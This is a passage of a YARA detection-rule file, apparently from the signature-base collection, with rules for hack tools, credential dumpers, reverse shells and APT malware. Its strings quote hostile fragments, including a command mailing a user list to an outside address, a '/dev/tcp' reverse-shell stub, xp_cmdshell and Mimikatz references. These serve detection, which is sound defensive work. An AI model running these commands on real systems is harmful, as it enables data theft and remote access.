		modified = "2025-04-14"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2869-L2887"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
		logic_hash = "a246eb907fd6525c96c911acde6b513fca68248ef8d4f8fa64039791942950ab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "mv scan.log bios.txt" fullword ascii
		$s2 = "rm -rf bios.txt" fullword ascii
		$s3 = "echo -e \"# by Eyes.\"" fullword ascii
		$s4 = "././pscan2 $1 22" fullword ascii
		$s10 = "echo \"#cautam...\"" fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Linuxhacktool_Eyes_Mass
{
	meta:
		description = "Linux hack tools - file mass"
		author = "Florian Roth (Nextron Systems)"
		id = "5da0c474-2dc8-5580-bf5c-d3f464225e4c"
		date = "2015-01-19"
		modified = "2025-04-14"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2889-L2906"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2054cb427daaca9e267b252307dad03830475f15"
		logic_hash = "5bf17d1a8ae78681d2c3cba8511019ddf85e6d7a242900b56848521eef40ffc6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
		$s3 = "killall -9 pscan2" fullword ascii
		$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
		$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Linuxhacktool_Eyes_Pscan2_2
{
	meta:
		description = "Linux hack tools - file pscan2.c"
		author = "Florian Roth (Nextron Systems)"
		id = "3950b235-70bc-5afd-add5-38c50055b28b"
		date = "2015-01-19"
		modified = "2025-04-14"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2908-L2925"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "eb024dfb441471af7520215807c34d105efa5fd8"
		logic_hash = "981514cf0887a1a7cb55fe9ed9dadd48adbf0f033e527b357e90e052a4c2d251"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "snprintf(outfile, sizeof(outfile) - 1, \"scan.log\", argv[1], argv[2]);" fullword ascii
		$s2 = "printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);" fullword ascii
		$s3 = "printf(\"\\n# pscan completed in %u seconds. (found %d ips)\\n\", (time(0) - sca" ascii
		$s19 = "connlist[i].addr.sin_family = AF_INET;" fullword ascii
		$s20 = "snprintf(last, sizeof(last) - 1, \"%s.%d.* (total: %d) (%.1f%% done)\"," fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_CN_Toolset__Xscanlib_Xscanlib_Xscanlib
{
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "c32415f4-044c-50ef-9c4c-b9327cbcef69"
		date = "2015-03-30"
		modified = "2025-04-14"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2959-L2980"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f7f66f1f3ca05e60ac850fbb94c471f664d2dc8a60c09b18686c9f2937296697"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "af419603ac28257134e39683419966ab3d600ed2"
		hash1 = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
		hash2 = "135f6a28e958c8f6a275d8677cfa7cb502c8a822"

	strings:
		$s1 = "Plug-in thread causes an exception, failed to alert user." fullword
		$s2 = "PlugGetUdpPort" fullword
		$s3 = "XScanLib.dll" fullword
		$s4 = "PlugGetTcpPort" fullword
		$s11 = "PlugGetVulnNum" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_CN_Toolset_Ntscan_Pipecmd
{
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "056ee42d-23f4-5b03-b240-392bc92b90b0"
		date = "2015-03-30"
		modified = "2025-04-14"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2982-L3006"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a931d65de66e1468fe2362f7f2e0ee546f225c4e"
		logic_hash = "2dab5a4de2abeff5659aa90fbc82bef359937ca9e45e8805b509baeb16943531"
		score = 70
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Please Use NTCmd.exe Run This Program." fullword ascii
		$s3 = "PipeCmd.exe" fullword wide
		$s4 = "\\\\.\\pipe\\%s%s%d" fullword ascii
		$s5 = "%s\\pipe\\%s%s%d" fullword ascii
		$s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
		$s7 = "%s\\ADMIN$\\System32\\%s" fullword ascii
		$s9 = "PipeCmdSrv.exe" fullword ascii
		$s10 = "This is a service executable! Couldn't start directly." fullword ascii
		$s13 = "\\\\.\\pipe\\PipeCmd_communicaton" fullword ascii
		$s14 = "PIPECMDSRV" fullword wide
		$s15 = "PipeCmd Service" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_CN_Toolset_Lscanportss_2
{
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0a796585-5fc8-5b55-acfc-3fe87308b681"
		date = "2015-03-30"
		modified = "2025-04-14"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L3008-L3028"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4631ec57756466072d83d49fbc14105e230631a0"
		logic_hash = "aeecdbef3fe6d66a209df10b44046783e53ef12f67c6877309cb219db4354733"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "LScanPort.EXE" fullword wide
		$s3 = "www.honker8.com" fullword wide
		$s4 = "DefaultPort.lst" fullword ascii
		$s5 = "Scan over.Used %dms!" fullword ascii
		$s6 = "www.hf110.com" fullword wide
		$s15 = "LScanPort Microsoft " fullword wide
		$s18 = "L-ScanPort2.0 CooFly" fullword wide

	condition:
		4 of them
}

rule SIGNATURE_BASE_CN_Toolset_Sig_1433_135_Sqlr
{
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "74038975-ef06-53d6-bdcc-02706408b596"
		date = "2015-03-30"
		modified = "2025-04-14"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L3030-L3047"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8542c7fb8291b02db54d2dc58cd608e612bfdc57"
		logic_hash = "14c9d104cfb71a2d3545bfb6274e3a282d4597f38057187d76adaf26fe2718fa"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
		$s11 = ";DATABASE=master" fullword ascii
		$s12 = "xp_cmdshell '" fullword ascii
		$s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Vssown_VBS
{
	meta:
		description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
		author = "Florian Roth (Nextron Systems)"
		id = "ffbb5faf-3522-50dc-a568-503074ac0636"
		date = "2015-10-01"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L3065-L3082"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f49e9d7a07d591330e16fc539bd98d019b47dd8579d0f1ad92fa987790e64189"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Select * from Win32_Service Where Name ='VSS'" ascii
		$s1 = "Select * From Win32_ShadowCopy" ascii
		$s2 = "cmd /C mklink /D " ascii
		$s3 = "ClientAccessible" ascii
		$s4 = "WScript.Shell" ascii
		$s5 = "Win32_Process" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Netview_Hacktool_Output
{
	meta:
		description = "Network domain enumeration tool output - often used by attackers - file filename.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "259db870-6293-5a55-b56a-f981c060c18f"
		date = "2016-03-07"
		modified = "2025-04-14"
		reference = "https://github.com/mubix/netview"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L3109-L3124"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "38a51e583b1485bdb29400cb9d0a73ec4d5387675779f949572d2b4d74da4230"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "[*] Using interval:" fullword
		$s2 = "[*] Using jitter:" fullword
		$s3 = "[+] Number of hosts:" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Powershell_Attack_Scripts
{
	meta:
		description = "Powershell Attack Scripts"
		author = "Florian Roth (Nextron Systems)"
		id = "e8c4a672-229b-56c8-811b-071ae9ff341e"
		date = "2016-03-09"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L3157-L3172"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "42a52de089ee00e229499fea23b8acd0b7c881a9c578671aea180c0c018a54e0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "PowershellMafia\\Invoke-Shellcode.ps1" ascii
		$s2 = "Nishang\\Do-Exfiltration.ps1" ascii
		$s3 = "PowershellMafia\\Invoke-Mimikatz.ps1" ascii
		$s4 = "Inveigh\\Inveigh.ps1" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Linux_Portscan_Shark_2
{
	meta:
		description = "Detects Linux Port Scanner Shark"
		author = "Florian Roth (Nextron Systems)"
		id = "eea378d5-0399-5035-8573-139878fa1abc"
		date = "2016-04-01"
		modified = "2025-04-14"
		reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L3218-L3235"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "45efbbe01c45065efc07e9c75b6a7cdcae469861f84df4a1e1381fe864f7ddc0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "5f80bd2db608a47e26290f3385eeb5bfc939d63ba643f06c4156704614def986"
		hash2 = "90af44cbb1c8a637feda1889d301d82fff7a93b0c1a09534909458a64d8d8558"

	strings:
		$s1 = "usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>" fullword ascii
		$s2 = "Difference between server modulus and host modulus is only %d. It's illegal and may not work" fullword ascii
		$s3 = "rm -rf scan.log" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_WCE_In_Memory
{
	meta:
		description = "Detects Windows Credential Editor (WCE) in memory (and also on disk)"
		author = "Florian Roth (Nextron Systems)"
		id = "90c90ca5-e3be-5035-b35c-c2e7faec43a5"
		date = "2016-08-28"
		modified = "2025-04-14"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L3265-L3279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "74ab7772db5b1de8a4eae03370e2be3cd35004730f84d472677688109a1d6d88"
		score = 80
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "wkKUSvflehHr::o:t:s:c:i:d:a:g:" fullword ascii
		$s2 = "wceaux.dll" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Msbuild_Mimikatz_Execution_Via_XML
{
	meta:
		description = "Detects an XML that executes Mimikatz on an endpoint via MSBuild"
		author = "Florian Roth (Nextron Systems)"
		id = "98aa68b9-6de4-5353-8d87-9e974529c044"
		date = "2016-10-07"
		modified = "2025-04-14"
		reference = "https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8#file-katz-xml"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L3417-L3436"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f926a2d5ab987b97c6ed2a89c69eac5549d8b7885bdbf75ce40e05e6ce6cfa7a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x1 = "<Project ToolsVersion=" ascii
		$x2 = "</SharpLauncher>" fullword ascii
		$s1 = "\"TVqQAAMAAAA" ascii
		$s2 = "System.Convert.FromBase64String(" ascii
		$s3 = ".Invoke(" ascii
		$s4 = "Assembly.Load(" ascii
		$s5 = ".CreateInstance(" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Remcom_Remotecommandexecution
{
	meta:
		description = "Detects strings from RemCom tool"
		author = "Florian Roth (Nextron Systems)"
		id = "90b4ce3c-a690-5b6e-95e8-7e5dc8270152"
		date = "2017-12-28"
		modified = "2025-04-14"
		reference = "https://goo.gl/tezXZt"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L4122-L4137"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c39a09c8d0c1799febcb4d9eafece43f8b21e7ffc277fdfad6c235eb1a201697"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$ = "\\\\.\\pipe\\%s%s%d"
		$ = "%s\\pipe\\%s%s%d%s"
		$ = "\\ADMIN$\\System32\\%s%s"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Lazagne_PW_Dumper
{
	meta:
		description = "Detects Lazagne PW Dumper"
		author = "Markus Neis / Florian Roth"
		id = "1904029e-9336-5278-ae2e-4bc853316600"
		date = "2018-03-22"
		modified = "2025-04-14"
		reference = "https://github.com/AlessandroZ/LaZagne/releases/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L4221-L4235"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2eac81d5cecdaca7eeaa83be70a688a595f8bbf54679ee565ba325b9e384552b"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "Crypto.Hash" fullword ascii
		$s2 = "laZagne" fullword ascii
		$s3 = "impacket.winregistry" fullword ascii

	condition:
		3 of them
}

rule SIGNATURE_BASE_SUSP_Shellpop_Bash
{
	meta:
		description = "Detects susupicious bash command"
		author = "Tobias Michalski"
		id = "771b7d01-272a-5986-af07-7417b84c52ed"
		date = "2018-05-18"
		modified = "2025-04-11"
		reference = "https://github.com/0x00-0x00/ShellPop"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L4399-L4416"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a557822eaaad84897acc32935f7545deb17ea3b8c6e34acd0ac5ef9fad08cb1e"
		score = 70
		quality = 85
		tags = ""
		hash1 = "36fad575a8bc459d0c2e3ad626e97d5cf4f5f8bedc56b3cc27dd2f7d88ed889b"

	strings:
		$x1 = "bash -i >& /dev/tcp/" ascii
		$x2 = "bash -i >& /dev/tcp/" ascii base64
		$fp1 = "bash -i >& /dev/tcp/IP/PORT" ascii

	condition:
		1 of ( $x* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_HKTL_Lazagne_Gen_18
{
	meta:
		description = "Detects Lazagne password extractor hacktool"
		author = "Florian Roth (Nextron Systems)"
		id = "034ea6d8-f5cf-5664-9ff9-24d19403093d"
		date = "2018-12-11"
		modified = "2025-04-14"
		reference = "https://creativecommons.org/licenses/by-nc/4.0/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L4572-L4589"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6f3e895080267a551a3b7a0ba2d4207b31befacbd35d1e6941e1b69d7e2689ce"
		score = 80
		quality = 85
		tags = ""
		hash1 = "51121dd5fbdfe8db7d3a5311e3e9c904d644ff7221b60284c03347938577eecf"

	strings:
		$x1 = "lazagne.config.powershell_execute(" ascii
		$x2 = "creddump7.win32." ascii
		$x3 = "lazagne.softwares.windows.hashdump" ascii
		$x4 = ".softwares.memory.libkeepass.common(" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_HKTL_Nopowershell
{
	meta:
		description = "Detects NoPowerShell hack tool"
		author = "Florian Roth (Nextron Systems)"
		id = "17d508d5-833f-5232-a071-dbed8758493b"
		date = "2018-12-28"
		modified = "2022-12-21"
		reference = "https://github.com/bitsadmin/nopowershell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L4591-L4608"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2207af9fcc61d547dfeff347a1eae2c59024a7270d1b8cbb7abef56d80864728"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70"

	strings:
		$x1 = "\\NoPowerShell.pdb" ascii
		$x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
		$x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
		$x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
		$x5 = "NoPowerShell.exe" fullword wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_Nazar_Svchost_Commands
{
	meta:
		description = "Detects Nazar's svchost based on supported commands"
		author = "Itay Cohen"
		id = "3e02381d-de03-50c8-8bde-2974ee96b7c1"
		date = "2020-04-26"
		modified = "2023-12-05"
		reference = "https://www.epicturla.com/blog/the-lost-nazar"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nazar.yar#L1-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c71e8a3b2d69c51ed3f822f62b90906fc0a21d32f1f1850cdef71c335964f9b1"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2fe9b76496a9480273357b6d35c012809bfa3ae8976813a7f5f4959402e3fbb6"
		hash2 = "be624acab7dfe6282bbb32b41b10a98b6189ab3a8d9520e7447214a7e5c27728"

	strings:
		$str1 = { 33 31 34 00 36 36 36 00 33 31 33 00 }
		$str2 = { 33 31 32 00 33 31 35 00 35 35 35 00 }
		$str3 = { 39 39 39 00 35 39 39 00 34 39 39 00 }
		$str4 = { 32 30 39 00 32 30 31 00 32 30 30 00 }
		$str5 = { 31 39 39 00 31 31 39 00 31 38 39 00 31 33 39 00 33 31 31 00 }

	condition:
		4 of them
}

rule SIGNATURE_BASE_Mimipenguin_SH
{
	meta:
		description = "Detects Mimipenguin Password Extractor - Linux"
		author = "Florian Roth (Nextron Systems)"
		id = "c670f6fe-562d-598f-a73f-45e4ab234f7d"
		date = "2017-04-01"
		modified = "2023-12-05"
		reference = "https://github.com/huntergregal/mimipenguin"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mimipenguin.yar#L8-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5d9827e7adfe667a4a46e23854cac3b63949abcde5709045f0fe65e7b5704265"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$(echo $thishash | cut -d'$' -f 3)" ascii
		$s2 = "ps -eo pid,command | sed -rn '/gnome\\-keyring\\-daemon/p' | awk" ascii
		$s3 = "MimiPenguin Results:" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_NTLM_Dump_Output
{
	meta:
		description = "NTML Hash Dump output file - John/LC format"
		author = "Florian Roth (Nextron Systems)"
		id = "d17ee473-317b-57d4-8ea8-7c89e8f2b2ed"
		date = "2015-10-01"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/generic_dumps.yar#L17-L30"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "154de926d27d38b38a4ed2c14b9122213fd1deb4115ef3bb77366db0818c7572"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "500:AAD3B435B51404EEAAD3B435B51404EE:" ascii
		$s1 = "500:aad3b435b51404eeaad3b435b51404ee:" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_Hawkeye_Keylogger_Gen_Dec18
{
	meta:
		description = "Detects HawkEye Keylogger Reborn"
		author = "Florian Roth (Nextron Systems)"
		id = "1d06f364-a4e2-5632-ad3a-d53a8cddf072"
		date = "2018-12-10"
		modified = "2023-12-05"
		reference = "https://twitter.com/James_inthe_box/status/1072116224652324870"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_hawkeye.yar#L20-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b850f02849030d9912b7571e33e969427ac8f721d2f288ae3ac3e971c4ee4263"
		score = 75
		quality = 85
		tags = ""
		hash1 = "b8693e015660d7bd791356b352789b43bf932793457d54beae351cf7a3de4dad"

	strings:
		$s1 = "HawkEye Keylogger" fullword wide
		$s2 = "_ScreenshotLogger" ascii
		$s3 = "_PasswordStealer" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Woolengoldfish_Sample_1
{
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		author = "Florian Roth (Nextron Systems)"
		id = "923de51a-8422-5318-95f5-79613d2d642e"
		date = "2015-03-25"
		modified = "2023-12-05"
		reference = "http://goo.gl/NpJpVZ"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_woolengoldfish.yar#L13-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7ad0eb113bc575363a058f4bf21dbab8c8f7073a"
		logic_hash = "9490715a2fc7d3c742771a8211bcfb4c0a0bafba4d5de8eee5825fdabaded6af"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Cannot execute (%d)" fullword ascii
		$s16 = "SvcName" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Woolengoldfish_Generic_1
{
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		author = "Florian Roth (Nextron Systems)"
		id = "351f5ee5-c0ec-51b6-9953-2b64e3e74b09"
		date = "2015-03-25"
		modified = "2023-12-05"
		reference = "http://goo.gl/NpJpVZ"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_woolengoldfish.yar#L30-L60"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "79879be4f49c8830573eb4a9f958ef9060413ea8b5dd3f8f3d5816e146d3a0b7"
		score = 90
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "5d334e0cb4ff58859e91f9e7f1c451ffdc7544c3"
		hash1 = "d5b2b30fe2d4759c199e3659d561a50f88a7fb2e"
		hash2 = "a42f1ad2360833baedd2d5f59354c4fc3820c475"

	strings:
		$x0 = "Users\\Wool3n.H4t\\"
		$x1 = "C-CPP\\CWoolger"
		$x2 = "NTSuser.exe" fullword wide
		$s1 = "107.6.181.116" fullword wide
		$s2 = "oShellLink.Hotkey = \"CTRL+SHIFT+F\"" fullword
		$s3 = "set WshShell = WScript.CreateObject(\"WScript.Shell\")" fullword
		$s4 = "oShellLink.IconLocation = \"notepad.exe, 0\"" fullword
		$s5 = "set oShellLink = WshShell.CreateShortcut(strSTUP & \"\\WinDefender.lnk\")" fullword
		$s6 = "wlg.dat" fullword
		$s7 = "woolger" fullword wide
		$s8 = "[Enter]" fullword
		$s9 = "[Control]" fullword

	condition:
		(1 of ( $x* ) and 2 of ( $s* ) ) or ( 6 of ( $s* ) )
}

rule SIGNATURE_BASE_Woolengoldfish_Generic_2
{
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		author = "Florian Roth (Nextron Systems)"
		id = "930b928f-ff32-56b2-9e3c-dd80036ff7ef"
		date = "2015-03-25"
		modified = "2023-12-05"
		reference = "http://goo.gl/NpJpVZ"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_woolengoldfish.yar#L62-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "25d2ea25543b0a6330e443333f1ac7a59874631c8ee7faeb4ea6d94c62c255fc"
		score = 90
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "47b1c9caabe3ae681934a33cd6f3a1b311fd7f9f"
